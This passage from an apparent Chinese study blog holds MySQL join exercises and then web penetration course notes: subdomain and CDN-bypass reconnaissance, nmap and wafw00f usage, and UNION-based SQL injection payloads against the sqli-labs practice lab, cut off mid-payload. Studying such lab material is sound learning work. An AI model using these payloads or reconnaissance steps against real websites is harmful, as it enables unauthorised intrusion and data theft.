‘blake’</p><p>7.使用连接查询，查询所有员工的部门和部门信息。</p><p>8.在employee表中，计算每个部门各有多少名员工。</p><p>9.在employee表中，计算不同类型职工的总工资数。</p><p>10.在employee表中，计算不同部门的平均工资。</p><p>11.在employee表中，查询工资低于1500的员工信息。</p><p>12.在employee表中，将查询记录先按部门编号由高到低排列，再按员工工资由高到低排列。</p><p>13.在employee表中，查询到目前为止，工龄大于等于10年的员工信息。</p><p>第三部分</p><p>多表连接练习</p><p>新建数据库dblx1，新建5个数据表：</p><p>Create database dblx1;</p><p>Use dblx1;</p><p>1.新建数据表fruits</p><p>CREATE TABLE fruits</p><p>(</p><p>f_id  char(8)   NOT NULL,</p><p>s_id  INT    NOT NULL,</p><p>f_name char(255) NOT NULL,</p><p>f_price decimal(10,2) NOT NULL,</p><p>PRIMARY KEY(f_id) </p><p>);</p><p>INSERT INTO fruits (f_id, s_id, f_name, f_price)</p><p>   VALUES(‘a1’, 81,’apple’,5.2),</p><p>   (‘b1’,81,’blackberry’, 8.2),</p><p>   (‘bs1’,82,’orange’, 11.2),</p><p>   (‘bs2’,85,’melon’,8.2),</p><p>   (‘t1’,82,’banana’, 8.3),</p><p>   (‘t2’,82,’grape’, 5.3),</p><p>   (‘o2’,83,’coconut’, 9.2),</p><p>   (‘c0’,81,’cherry’, 3.2),</p><p>   (‘a2’,83, ‘apricot’,2.2),</p><p>   (‘l2’,84,’lemon’, 6.4),</p><p>   (‘b2’,84,’berry’, 7.6),</p><p>   (‘m1’,86,’mango’, 15.6),</p><p>   (‘m2’,85,’xbabay’, 2.6),</p><p>   (‘t4’,87,’xbababa’, 3.6),</p><p>   (‘m3’,85,’xxtt’, 11.6),</p><p>   (‘b5’,87,’xxxx’, 3.6);</p><p>2.创建数据表suppliers</p><p>CREATE TABLE suppliers</p><p>(</p><p> s_id   int   NOT NULL AUTO_INCREMENT,</p><p> s_name  char(50) NOT NULL,</p><p> s_city  char(50) NULL,</p><p> s_zip   char(8) NULL,</p><p> s_call  CHAR(50) NOT NULL,</p><p> PRIMARY KEY (s_id)</p><p>) ;</p><p>INSERT INTO suppliers(s_id, s_name,s_city, s_zip, s_call)</p><p>VALUES(81,’FastFruit Inc.’,’Tianjin’,’300000’,’48075’),</p><p>(82,’LT Supplies’,’Chongqing’,’400000’,’44333’),</p><p>(83,’ACME’,’Shanghai’,’200000’,’90046’),</p><p>(84,’FNK Inc.’,’Zhongshan’,’528437’,’11111’),</p><p>(85,’Good Set’,’Taiyuang’,’030000’, ‘22222’),</p><p>(86,’Just Eat Ours’,’Beijing’,’08’, ‘45678’),</p><p>(87,’DK Inc.’,’Zhengzhou’,’450000’, ‘33332’);</p><p>3.创建表orders</p><p>CREATE TABLE orders</p><p>(</p><p> o_num int   NOT NULL AUTO_INCREMENT,</p><p> o_date datetime NOT NULL,</p><p> c_id  int   NOT NULL,</p><p> PRIMARY KEY (o_num)</p><p>) ;</p><p>INSERT INTO orders(o_num, o_date, c_id)</p><p>VALUES(30001, ‘2008-09-01’, 8001),</p><p>(30002, ‘2008-09-12’, 8003),</p><p>(30003, ‘2008-09-30’, 8004),</p><p>(30004, ‘2008-8-03’, 8005),</p><p>(30005, ‘2008-8-08’, 8001);</p><p>4.新建数据表orderitems</p><p>CREATE TABLE orderitems</p><p>(</p><p> o_num   int     NOT NULL,</p><p> o_item   int     NOT NULL,</p><p> f_id    char(8)   NOT NULL,</p><p> quantity  int     NOT NULL,</p><p> item_price decimal(8,2) NOT NULL,</p><p> PRIMARY KEY (o_num,o_item)</p><p>) ;</p><p>INSERT INTO orderitems(o_num, o_item, f_id, quantity, item_price)</p><p>VALUES(30001, 1, ‘a1’, 8, 5.2),</p><p>(30001, 2, ‘b2’, 3, 7.6),</p><p>(30001, 3, ‘bs1’, 5, 11.2),</p><p>(30001, 4, ‘bs2’, 15, 9.2),</p><p>(30002, 1, ‘b3’, 2, 20.0),</p><p>(30003, 1, ‘c0’, 80, 8),</p><p>(30004, 1, ‘o2’, 50, 2.50),</p><p>(30005, 1, ‘c0’, 5, 8),</p><p>(30005, 2, ‘b1’, 8, 8.99),</p><p>(30005, 3, ‘a2’, 8, 2.2),</p><p>(30005, 4, ‘m1’, 5, 14.99);</p><p>5.创建数据表customers</p><p>CREATE TABLE customers</p><p>(</p><p> c_id   int    NOT NULL AUTO_INCREMENT,</p><p> c_name  char(50) NOT NULL,</p><p> c_address char(50) NULL,</p><p> c_city  char(50) NULL,</p><p> c_zip   char(8) NULL,</p><p> c_contact char(50) NULL,</p><p> c_email  char(255) NULL,</p><p> PRIMARY KEY (c_id)</p><p>);</p><p>INSERT INTO customers(c_id, c_name, c_address, c_city, </p><p>c_zip, c_contact, c_email) </p><p>VALUES(8001, ‘RedHook’, ‘200 Street ‘, ‘Tianjin’, </p><p> ‘300000’, ‘LiMing’, ‘LMing@163.com’),</p><p>(8002, ‘Stars’, ‘333 Fromage Lane’,</p><p> ‘Dalian’, ‘116000’, ‘Zhangbo’,‘Jerry@hotmail.com’),</p><p>(8003, ‘Netbhood’, ‘1 Sunny Place’, ‘Qingdao’, ‘266000’,</p><p> ‘LuoCong’, NULL),</p><p>(8004, ‘JOTO’, ‘829 Riverside Drive’, ‘Haikou’, </p><p> ‘570000’, ‘YangShan’, ‘sam@hotmail.com’);</p><p>一、多表连接练习</p><p>1.在fruits表和suppliers表之间使用内连接查询。</p><p>查询之前，查看两个表的结构：</p><p> DESC fruits;</p><p> DESC suppliers;</p><p>由结果可以看到，fruits表和suppliers表中都有相同数据类型的字段s_id，两个表通过s_id字段建立联系。</p><p>从fruits表中查询f_name、f_price字段，从suppliers表中查询s_id、s_name，SQL语句如下：</p><p> SELECT suppliers.s_id, s_name,f_name, f_price</p><p>   FROM fruits ,suppliers</p><p>   WHERE fruits.s_id = suppliers.s_id;</p><p>2.在fruits表和suppliers表之间，使用INNER JOIN语法进行内连接查询。</p><p>SELECT suppliers.s_id, s_name,f_name, f_price</p><p>   FROM fruits INNER JOIN suppliers</p><p>   ON fruits.s_id = suppliers.s_id;</p><p>3.在customers表和orders表中，查询所有客户，包括没有订单的客户。</p><p>SELECT customers.c_id, orders.o_num</p><p>   FROM customers LEFT OUTER JOIN orders</p><p>   ON customers.c_id = orders.c_id;</p><p>4.在customers表和orders表中，使用INNER JOIN语法查询customers表中ID为8001的客户的订单信息。</p><p>5.在customers表和orders表中，查询所有订单，包括没有客户的订单。</p><p>SELECT customers.c_id, orders.o_num</p><p>   FROM customers RIGHT OUTER JOIN orders</p><p>   ON customers.c_id = orders.c_id;</p><p>6.在customers表和orders表中，使用INNER JOIN语法查询customers表中ID为8001的客户的订单信息。</p><p>SELECT customers.c_id, orders.o_num</p><p>   FROM customers INNER JOIN orders</p><p>   ON customers.c_id = orders.c_id AND customers.c_id = 8001;</p><p>7.在fruits表和suppliers表之间，使用INNER JOIN语法进行内连接查询，并对查询结果排序。</p><p>SELECT suppliers.s_id, s_name,f_name, f_price</p><p>   FROM fruits INNER JOIN suppliers</p><p>   ON fruits.s_id = suppliers.s_id</p><p>   ORDER BY fruits.s_id;</p><p>8.查询suppliers表中是否存在s_id=87的供应商，如果存在，则查询fruits表中的记录。</p><p>SELECT * FROM fruits</p><p>   WHERE EXISTS</p><p>   (SELECT s_name FROM suppliers WHERE s_id = 87);</p><p>9.查询suppliers表中是否存在s_id=87的供应商，如果存在，则查询fruits表中的f_price大于8.20的记录。</p><p>SELECT * FROM fruits</p><p>   WHERE f_price&gt;8.20 AND EXISTS</p><p>   (SELECT s_name FROM suppliers WHERE s_id = 87);</p><p>10.查询suppliers表中是否存在s_id=87的供应商，如果不存在则查询fruits表中的记录。</p><p>SELECT * FROM fruits</p><p>   WHERE NOT EXISTS</p><p>   (SELECT s_name FROM suppliers WHERE s_id = 87);</p><p>11.在orderitems表中查询f_id为c0的订单号，并根据订单号查询具有订单号的客户c_id。</p><p>SELECT c_id FROM orders WHERE o_num IN</p><p>   (SELECT o_num FROM orderitems WHERE f_id = ‘c0’);</p><p>12.在suppliers表中查询s_city等于“Tianjin”的供应商s_id，然后在fruits表中查询所有该供应商提供的水果的种类。</p><p>SELECT s_id, f_name FROM fruits</p><p>WHERE s_id =</p><p>(SELECT s1.s_id FROM suppliers AS s1 WHERE s1.s_city = ‘Tianjin’);</p><p>13.在suppliers表中查询s_city等于“Tianjin”的供应商s_id，然后在fruits表中查询所有非该供应商提供的水果的种类。</p><p>SELECT s_id, f_name FROM fruits</p><p>   WHERE s_id &lt;&gt;</p><p>   (SELECT s1.s_id FROM suppliers AS s1 WHERE s1.s_city = ‘Tianjin’);</p><ol><li>子查询</li></ol><p>CREATE table tbl1 ( num1 INT NOT NULL);</p><p>CREATE table tbl2 ( num2 INT NOT NULL);</p><p>分别向两个表中插入数据：</p><p>INSERT INTO tbl1 values(1), (5), (13), (27);</p><p>INSERT INTO tbl2 values(6), (14), (11), (20);</p><p>ANY关键字接在一个比较操作符的后面，表示若与子查询返回的任何值比较为TRUE，则返回TRUE。</p><p>返回tbl2表的所有num2列，然后将tbl1中的num1的值与之进行比较，只要大于num2的任何1个值，即为符合查询条件的结果。</p><p> SELECT num1 FROM tbl1 WHERE num1 &gt; ANY (SELECT num2 FROM tbl2);</p><p>返回tbl2表的所有num2列，然后将tbl1中的num1的值与之进行比较，只要大于num2的任何1个值，即为符合查询条件的结果。</p><p> SELECT num1 FROM tbl1 WHERE num1 &gt; ANY (SELECT num2 FROM tbl2);</p><p>返回tbl1表中比tbl2表num2 列所有值都大的值，SQL语句如下：</p><p> SELECT num1 FROM tbl1 WHERE num1 &gt; ALL (SELECT num2 FROM tbl2);</p><p>返回tbl1表中比tbl2表num2 列所有值都大的值，SQL语句如下：</p><p> SELECT num1 FROM tbl1 WHERE num1 &gt; ALL (SELECT num2 FROM tbl2);</p><p>三、自连接</p><p>create table tb_user2</p><p>(</p><p>uid char(10) not null primary key,</p><p>username nvarchar(20) not null,</p><p>usersex char(2),</p><p>userage int</p><p>);</p><p>insert into tb_user2(uid,username,usersex,userage) </p><p>values(‘u1001’,’张小明’,’男’,30),(‘u1002’,’李华’,’男’,34),(‘u1003’,’李小红’,’女’,32),(‘u1004’,’张天浩’,’男’,40),(‘u1005’,’李洁’,’女’,29),(‘u1006’,’黄维’,’女’,33),(‘u1007’,’余明杰’,’男’,25);</p><p>例：使用自连接，将员工表的男性与每一个女性进行比较，并求出年龄差。</p><p>将一个表中符合某一条件的行与同一个表中另外一些行进行比较，连接条件是性别不同。新建一个表tb_user2，设置性别列。</p><p>Select m.username,m.usersex,g.username,g.usersex,g.userage-m.userage from tb_user2 g inner join tb_user2 m on g.usersex&lt;&gt;m.usersex;</p><p>Select m.username,m.usersex,g.username,g.usersex,g.userage-m.userage from tb_user2 g inner join tb_user2 m on g.usersex&lt;&gt;m.usersex where g.userage-m.userage in (2,3,4,-2,-3,-4);</p><p>Select m.username,m.usersex,g.username,g.usersex,g.userage-m.userage from tb_user2 g inner join tb_user2 m on g.usersex&lt;&gt;m.usersex;</p><p>Select m.username,m.usersex,g.username,g.usersex,g.userage-m.userage from tb_user2 g inner join tb_user2 m on g.usersex&lt;&gt;m.usersex where g.userage-m.userage in (2,3,4,-2,-3,-4);</p><p>第四部分</p><p>多表连接练习：</p><p>新建数据库 dblx1，建立3个数据表</p><p>create database dblx1;</p><p>use dblx1;</p><p>建立数据表staff  </p><p>create table staff(</p><p>staff_id int(10) unsigned not null auto_increment,</p><p>section_id int(10) unsigned not null,</p><p>positions_id int(10) not null,</p><p>name varchar(10) not null,</p><p>sex enum(‘男’,’女’) not null,</p><p>phone_number char(11) not null,</p><p>money decimal(10,2)  unsigned not null default ‘0.00’,</p><p>entry_date datetime not null,</p><p>primary key(staff_id)</p><p>);</p><p>insert into staff(staff_id,section_id,positions_id,name,sex,phone_number,money,entry_date)</p><p>values(1,’1’,’1’,’刘长生’,’男’,’13753697300’,20000,’2018-04-02 14:35:52’),(2,’1’,’2’,’赵霞’,’女’,’13753697301’,10000,’2018-04-02 14:40:52’),(3,’2’,’3’,’季庆奇’,’女’,’13753697302’,15000,’2018-04-02 14:43:52’),(4,’3’,’3’,’李星宇’,’男’,’13753697303’,15000,’2018-04-02 14:45:52’),(5,’4’,’3’,’张向阳’,’男’,’13753697304’,15000,’2018-04-02 14:47:24’),(6,’4’,’8’,’张旭’,’男’,’13753697305’,10000,’2018-04-02 14:50:52’);</p><p>insert into staff(staff_id,section_id,positions_id,name,sex,phone_number,money,entry_date)</p><p>values(7,’1’,’8’,’孙伟’,’男’,’13711697211’,25000,’2019-04-02 14:35:52’);</p><p>create table section(</p><p>section_id int(10) unsigned not null auto_increment,</p><p>section_title varchar(20) not null,</p><p>primary key(section_id)</p><p>);</p><p>insert into section(section_id,section_title) values(1,’总经办’),(2,’财务部’),(3,’销售部’),(4,’研发部’),(5,’运营部’),(6,’人力资源部’),(7,’售后服务部’);</p><p>1.在staff表和section表之间使用内连接查询，从staff表中查询staff_id（员工id）、name(姓名)、sex（性别）、phone_number（手机号）， 从section表中查询section_title（部门名称）。</p><p>select staff_id,name,sex,section_title,phone_number from staff inner join section on staff.section_id=section.section_id;</p><p>注意：select后面指定的列分别属于两个不同的表；同时，from子句列出了两个表，两个表之间的关系通过inner join指定，连接条件使用on子句给出。</p><p>使用where子句也可以给出连接条件，将返回与上一条命令完全相同的结果。</p><p>select staff_id,name,sex,section_title,phone_number from staff ,section where staff.section_id=section.section_id;</p><p>2.使用内连接查询 ，从staff表中查询薪资低于15000的员工的staff_id(员工id)、name(姓名)、money(薪资)。</p><p>select s1.staff_id,s1.name,s2.money from staff as s1 inner join staff as s2 on s1.staff_id=s2.staff_id and s2.money&lt;15000;</p><p>3.在staff表和section表中，执行内连接查询语句，查询section表中部门名称为“总经办”的员工id、姓名、性别和电话号码等信息。</p><p>use staff</p><p>select staff_id,name,sex,section_title,phone_number from staff inner join section on staff.section_id=section.section_id where section.section_title=’总经办’;</p><p>select staff_id,name,sex,section_title,phone_number from staff inner join section on staff.section_id=section.section_id;</p><p>外连接查询 （outer join）是以一张表为基表，根据连接条件，与另外一张表的每一行进行匹配，如果没有匹配上，则在相关联的结果行中，另一张表的所有选择列均返回空值。</p><p>外连接查询通常分为两种：左连接查询（left join）和右连接查询（right join）。</p><p>以goods表和orders表</p><p>create table orders(</p><p>o_id int(11) primary key,</p><p>add_time datetime,</p><p>goods_id int(11)</p><p>);</p><p>insert into orders(o_id,add_time,goods_id) values(1,’2018-04-02 14:35:52’,6),(2,’2018-04-03 14:40:52’,1),(3,’2018-04-03 14:45:52’,5),(4,’2018-04-03 14:35:52’,1),(5,’2018-04-03 14:47:24’,15),(6,’2018-04-03 14:50:52’,4);</p><p>create table goods(</p><p>id int(11) primary key  auto_increment,</p><p>type varchar(30) not null,</p><p>name varchar(30) unique,</p><p>price decimal(7,2)  unsigned,</p><p>num int(11) default 0,</p><p>add_time datetime</p><p>);</p><p>insert into goods(id,type,name,price,num,add_time) values(1,’书籍’,’西游记’,50.4,20,’2018-01-01 13:40:40’);</p><p>insert into goods(id,type,name,price,num,add_time) values(2,’书籍’,”水浒传”,60.5,20,”2019-02-02 19:40:40”);</p><p>insert into goods values(3,’书籍’,”红楼梦”,70.2,20,”2020-03-03 9:10:30”);</p><p>insert into goods(id,type,name,price,num,add_time) values(5,’服饰’,”休闲西服”,800,null,”2019-04-04 13:40:40”),</p><p>(6,’饮品’,”果汁”,3,70,”2019-05-05 13:40:40”),</p><p>(7,’书籍’,”论语”,109,50,”2019-06-06 13:40:40”),</p><p>(8,’书籍’,”数据库”,35,2,”2020-02-02 19:40:40”);</p><p>3.左外连接查询</p><p>在外连接查询语句中，left join关键字之前的表称为左表，左连接查询会以左表为基表，与另外一张表的每一行进行匹配，如果符合连接条件，则返回两张表相对应的行；如果不符合，则只返回左表中的行，并且其对应的行为一个空值。</p><p>执行左连接查询，查询goods表中哪些商品有订单，哪些商品没有订单。</p><p>select goods.id,goods.name,orders.o_id  from goods left join orders on goods.id=orders.goods_id;</p><p>4.在goods表和orders表中查询哪些商品有订单，哪些商品没有订单，并使用商品ID号对查询结果进行排序。</p><p>use db_shop;</p><p>select goods.id,goods.name,orders.o_id from goods left join orders on goods.id=orders.goods_id order by goods.id;</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于HW前的学习</title>
      <link href="/2021/03/19/hua-meng-xue-yuan/"/>
      <url>/2021/03/19/hua-meng-xue-yuan/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1297742167&auto=1&height=66"></iframe><h1 id="1-前端基础"><a href="#1-前端基础" class="headerlink" title="1.前端基础"></a>1.前端基础</h1><h2 id="1-HTML静态页面基础课"><a href="#1-HTML静态页面基础课" class="headerlink" title="1.HTML静态页面基础课"></a>1.HTML静态页面基础课</h2><pre><code>&lt;strong&gt;&lt;/strong&gt;加粗</code></pre><p>表格标签：</p><pre><code>&lt;tr&gt;&lt;/tr&gt;表示一行&lt;td&gt;&lt;/td&gt;表示一行中的内容</code></pre><p>td中含有属性：居中对齐等</p><p>table中含有单元格间距和填充，合并单元格等。。</p><p>列表标签：</p><p><a href="http://t.mb5u.com/html/detail/detail_input.html" target="_blank" rel="noopener">表单标签：</a></p><p>作业：99乘法表</p><h2 id="2-HTML静态开发"><a href="#2-HTML静态开发" class="headerlink" title="2.HTML静态开发"></a>2.HTML静态开发</h2><pre><code>&lt;p&gt;&lt;/p&gt;段落标签其可以与加粗，倾斜，删除线，下划线结合使用&lt;div&gt;&lt;/div&gt;一般用于存放图片，文字，视频等网页内容，可以以理解为一个盒子，可以存放一切东西&lt;span&gt;&lt;/span&gt;与上面不同的是它只可以存放文字&lt;img /&gt;指定图像文件</code></pre><p><a href="https://www.webhek.com/post/html-enerty-code.html" target="_blank" rel="noopener">特殊字符 </a></p><h2 id="3-CSS层叠样式开发"><a href="#3-CSS层叠样式开发" class="headerlink" title="3.CSS层叠样式开发"></a>3.CSS层叠样式开发</h2><h2 id="5-Javascript基础"><a href="#5-Javascript基础" class="headerlink" title="5.Javascript基础"></a>5.Javascript基础</h2><p>windows.alert()弹出警告框</p><p>document.write()将方法写入到HTML文档中</p><p>innerHTML写入到HTML元素</p><p>使用console.log()写入到浏览器的控制台(console.log可以使想要的内容在控制台输出)</p><p>在使用时需要将其到加入</p><pre><code>&lt;script&gt;&lt;/script&gt;</code></pre><p>标签</p><h2 id="6-Javascript对象与事件"><a href="#6-Javascript对象与事件" class="headerlink" title="6.Javascript对象与事件"></a>6.Javascript对象与事件</h2><p><a href="http://c.biancheng.net/view/5944.html" target="_blank" rel="noopener">js鼠标事件</a></p><p><a href="https://www.jianshu.com/p/dbbd31eb5b26" target="_blank" rel="noopener">表单相关事件</a></p><p><a href="https://blog.csdn.net/smartsmile2012/article/details/53940331" target="_blank" rel="noopener">JS鼠标事件、HTML页面事件大全</a></p><p>关于onfocus获取焦点事件可以用来防御对输入框进行攻击的时候的使用，保证出现无限弹窗</p><h1 id="2-PHP课程"><a href="#2-PHP课程" class="headerlink" title="2.PHP课程"></a>2.PHP课程</h1><h2 id="1-php运算"><a href="#1-php运算" class="headerlink" title="1.php运算"></a>1.php运算</h2><p>1.十进制dec二进制bin八进制oct十六进制hex</p><pre><code>echo decbin(123);//十进制转二进制依次类推即可</code></pre><p>2.’ ‘与” “的区别：前者内容包裹的是纯纯的字符串，而后者中可以包裹的有变量</p><p>3.错误抑制符@：在已知一些错误会报错，但是不想让他报错，就用到了错误抑制符（@）</p><h2 id="2-PHP循环"><a href="#2-PHP循环" class="headerlink" title="2.PHP循环"></a>2.PHP循环</h2><ul><li>for循环：通过天剑、起始和终止判断执行</li><li>while循环：通过判断条件终止</li><li>do-while：跟while差不多</li><li>foreach循环：专门针对数组</li></ul><p>for循环之死循环：</p><pre><code>无增量，条件永远为真：&lt;?phpfor($i=1;$i&lt;10;){}只要没有条件都是死循环：&lt;?phpfor($i=1;;$i++){}无条件无增量&lt;?phpfor(;;){}</code></pre><h2 id="3-PHP函数文件上传"><a href="#3-PHP函数文件上传" class="headerlink" title="3.PHP函数文件上传"></a>3.PHP函数文件上传</h2><p>被传入的参数称为实参</p><p>$_FILES在PHP中，是一个预定义变量，专门用来储存上传的文件</p><h2 id="4-PHP面向对象命名空间"><a href="#4-PHP面向对象命名空间" class="headerlink" title="4.PHP面向对象命名空间"></a>4.PHP面向对象命名空间</h2><p>类常量（在类中定义常量）的定义只能使用一种方式：const 常量名= 值；</p><p>命名空间：</p><p>避免出现相同结构而造成的冲突，比如一个文件夹下面不能有两个1.php，所以需要建两个空间，这样重名的话就不会报错，定义命名空间的时候其前面是不能有代码的</p><h2 id="5-PHP数据库"><a href="#5-PHP数据库" class="headerlink" title="5.PHP数据库"></a>5.PHP数据库</h2><p>MySQL连接只限于php7版本以下</p><h2 id="6-php开发小实例"><a href="#6-php开发小实例" class="headerlink" title="6.php开发小实例"></a>6.php开发小实例</h2><h1 id="3-WEB渗透精英班课程"><a href="#3-WEB渗透精英班课程" class="headerlink" title="3.WEB渗透精英班课程"></a>3.WEB渗透精英班课程</h1><h2 id="1-基础篇课程-扫盲课"><a href="#1-基础篇课程-扫盲课" class="headerlink" title="1.基础篇课程(扫盲课)"></a>1.基础篇课程(扫盲课)</h2><ul><li><h3 id="计算机组成与DOS命令"><a href="#计算机组成与DOS命令" class="headerlink" title="计算机组成与DOS命令"></a>计算机组成与DOS命令</h3></li></ul><h4 id="常见的协议与端口："><a href="#常见的协议与端口：" class="headerlink" title="常见的协议与端口："></a>常见的协议与端口：</h4><p>21/tcp FTP 文件传输协议；25 SMTP；69/udp 简单文件传输协议；110/tcp pop3邮件接收；443 HTTPS 安全的HTTP（加密传输）；3389/rdp 远程连接 远程桌面；445/smb 文件共享；3306 MySQL数据库；1521 Oracle数据库；</p><h4 id="常见的dos命令"><a href="#常见的dos命令" class="headerlink" title="常见的dos命令"></a><a href="https://wenku.baidu.com/view/8ffad7a9dd3383c4bb4cd29a.html" target="_blank" rel="noopener">常见的dos命令</a></h4><ul><li><h3 id="计算机网络基础"><a href="#计算机网络基础" class="headerlink" title="计算机网络基础"></a>计算机网络基础</h3></li></ul><p><a href="https://blog.csdn.net/yaopeng_2005/article/details/7064869" target="_blank" rel="noopener">osi七层模型：</a></p><p><a href="https://blog.csdn.net/ffsiwei/article/details/82121010" target="_blank" rel="noopener">tcp/ip五层模型：</a></p><p><a href="https://blog.csdn.net/qq_30553235/article/details/79282113" target="_blank" rel="noopener">常用的HTTP请求头与响应头</a></p><ul><li><h3 id="靶场环境搭建"><a href="#靶场环境搭建" class="headerlink" title="靶场环境搭建"></a>靶场环境搭建</h3></li></ul><p><a href="https://blog.csdn.net/m0_46575550/article/details/106576158" target="_blank" rel="noopener">要求给你一个网站，需要了解到这个网站的一些配置</a></p><ul><li><h3 id="Linux使用（review）"><a href="#Linux使用（review）" class="headerlink" title="Linux使用（review）"></a>Linux使用（review）</h3></li></ul><p><a href="https://www.runoob.com/linux/linux-command-manual.html" target="_blank" rel="noopener">Linux命令大全</a></p><p><a href="https://blog.csdn.net/qq_36802111/article/details/82177844" target="_blank" rel="noopener">Linux常用命令大全+详解</a></p><p>find grep</p><p>uptime</p><p><strong>进程信息查看：</strong></p><pre><code>ps aux暂时的查看当前cpu的使用率ps top动态的查看kill [-9] [进程代号]：-9表示强行删除</code></pre><p>mkdir (file)：创建一个文本夹</p><p>touch 创建txt文件</p><p>dir：查看当前的目录</p><p>ls -la：查看当前文件并更多信息（如：文件所被给予的权限）</p><p>rm <file>：-rf强行删除文件</file></p><p>rmdir（英文全拼：remove directory）：删除一个空的目录</p><p>tar -cvf 1.tar 1.txt ：打包1.txt文件</p><p>tar -xvf 1.tar 1.txt ：解包</p><p>gzip表示压缩，与tar命令结合使用：例如-zxvf，同时打包文件.tar.gz</p><ul><li><h3 id="kali的安装与配置"><a href="#kali的安装与配置" class="headerlink" title="kali的安装与配置"></a>kali的安装与配置</h3></li></ul><h2 id="2-WEB渗透篇"><a href="#2-WEB渗透篇" class="headerlink" title="2.WEB渗透篇"></a>2.WEB渗透篇</h2><ul><li><h3 id="网络安全与渗透测试流程"><a href="#网络安全与渗透测试流程" class="headerlink" title="网络安全与渗透测试流程"></a>网络安全与渗透测试流程</h3></li></ul><p>威胁建模阶段→漏洞分析阶段→渗透攻击阶段→后渗透攻击阶段→撰写报告阶段</p><p>实际渗透测试中的流程：</p><p>明确目标→信息收集→漏洞发现→漏洞利用→后渗透→报告文档阶段</p><ul><li><h3 id="资产与信息收集"><a href="#资产与信息收集" class="headerlink" title="资产与信息收集"></a>资产与信息收集</h3></li></ul><p>1.从主域名出发，向其旁站扩散</p><p>2.子域名收集（layer子域名挖掘机（枚举性质），<a href="https://github.com/shmilylty/OneForAll" target="_blank" rel="noopener">oneforall</a>（根据接口，需要配置api：在\OneForAll-master\config\api.py ）），相关域名收集</p><p>3.通过搜索引擎（第三方）：常用第三方子域名爆破接口</p><p><a href="https://phpinfo.me/domain/" target="_blank" rel="noopener">https://phpinfo.me/domain/</a></p><p><a href="https://dnsdumpster.com/" target="_blank" rel="noopener">https://dnsdumpster.com/</a></p><p><a href="https://www.virustotal.com/gui/home/search" target="_blank" rel="noopener">https://www.virustotal.com/gui/home/search</a></p><p><a href="http://tool.chinaz.com/subdomain/" target="_blank" rel="noopener">http://tool.chinaz.com/subdomain/</a></p><p><a href="http://searchdns.netcraft.com/" target="_blank" rel="noopener">http://searchdns.netcraft.com/</a></p><p><a href="https://phpinfo.me/domain/" target="_blank" rel="noopener">https://phpinfo.me/domain/</a></p><p><a href="https://chapangzhan.com/（旁站查询）" target="_blank" rel="noopener">https://chapangzhan.com/（旁站查询）</a></p><p>4.app，小程序，公众号</p><p>5.备案信息查询（基本无效信息）：</p><p>爱站网，<a href="https://beian.tianyancha.com/" target="_blank" rel="noopener">天眼查</a></p><p>6.ip信息收集：有的企业做了cdn加速，例如使用七牛云针对图床进行加速，所以就需要进行cdn的绕过，来找到被加速的服务器（ip地址）</p><p>绕过方法：</p><ul><li><p><strong>多地ping</strong>（国外）</p></li><li><p><strong>对分站进行ping</strong></p></li></ul><p>7.在线cms指纹识别</p><p>云悉指纹：<a href="http://www.yunsee.cn/" target="_blank" rel="noopener">http://www.yunsee.cn/</a><br>潮汐指纹：<a href="http://finger.tidesec.net/" target="_blank" rel="noopener">http://finger.tidesec.net/</a></p><p>8.服务器/中间器/站点架构信息</p><p>9.利用nmap：</p><p>-vv：对结果的详细输出</p><p>-sP：ping扫描</p><p>-sT：tcp连接扫描：完整三次握手，最基础稳定的扫描方式</p><p>-sS：tcp syn扫描</p><p>-sU：udp扫描，扫描速度非常慢</p><p>-P0：无ping扫描，用于进制ping的扫描</p><p>10.waf信息识别：</p><pre><code>wafw00f -a [域名]</code></pre><ul><li><h3 id="MySQL基础"><a href="#MySQL基础" class="headerlink" title="MySQL基础"></a>MySQL基础</h3></li></ul><p><strong>MySQL基础语法：</strong></p><p>select version()；</p><p>select user();</p><p>select @@basedir;查询当前路径。</p><p>show databases；</p><p>use + 数据库名；选择一个数据库。</p><p>select database();查询当前数据库。</p><p>show tables;查询所有表名。</p><p>create database + 数据库名;创建一个数据库。</p><p>drop database + 数据库名;删除一个数据库。</p><p>desc + 表名;查询一个表的结构。</p><p><strong>当创建一个表的时候它有六个属性：field(文件名)、type(类型)、null、key、default、extra</strong></p><p>想要使用中文，就要设置起编码：set names gbk；</p><p><strong>更新数据：</strong></p><p>1.更新指定数据，使用where子句来指定</p><p>update 表名 set 字段名1=值1，[字段名2=值2] [where条件表达式]</p><p>例如：向数据库class下student表中id为1的数据中字段age改为16，字段birthday改为2004。</p><p>update student set age =16，birthday=2004 where id=1;</p><p>2.如果没有where语句，则表中所有的记录都更新</p><p><strong>distinct关键字查询：</strong></p><p>例如：</p><p>查询数据库class下查student表中birthday字段的值，结果中不允许出现重复的值。</p><p>select distinct birthday from student;</p><p><strong>带like关键字的查询：</strong></p><p>%通配符</p><p>例如：</p><p>查询数据库class下student表中呢么字段以字符“s”开头的的人的id，name。</p><p>select id,name from student where name like “s%”；</p><p><strong>count函数</strong>：统计记录的条数</p><p>例如：</p><p>select count(*) from student;</p><p><strong>group by</strong>：</p><p>将列中的字段（相同）按组排列</p><p><strong>order by</strong>：</p><p>按照列中的内容进行排列</p><p><a href="https://blog.csdn.net/qq_22642239/article/details/52127016" target="_blank" rel="noopener">MySQL函数大全</a></p><p><strong>source +.sql文件</strong>：将.sql文件载入到数据库中</p><p><strong>内联注释</strong>:(查版本号)</p><pre><code>/*![版本号]*/</code></pre><p>若大于则执行失败</p><ul><li><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2></li></ul><h4 id="判断注入："><a href="#判断注入：" class="headerlink" title="判断注入："></a>判断注入：</h4><p> 1.利用and 和or来判断，xor异或：只有当一真一假的时候才会为正确，其余的都是假的</p><h4 id="sqli-labs搭建完成："><a href="#sqli-labs搭建完成：" class="headerlink" title="sqli-labs搭建完成："></a><strong>sqli-labs搭建完成：</strong></h4><h5 id="less-2："><a href="#less-2：" class="headerlink" title="less-2："></a>less-2：</h5><pre><code>-1 union select 1,database(),3</code></pre><p>库名：security</p><pre><code>-1 union select 1,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 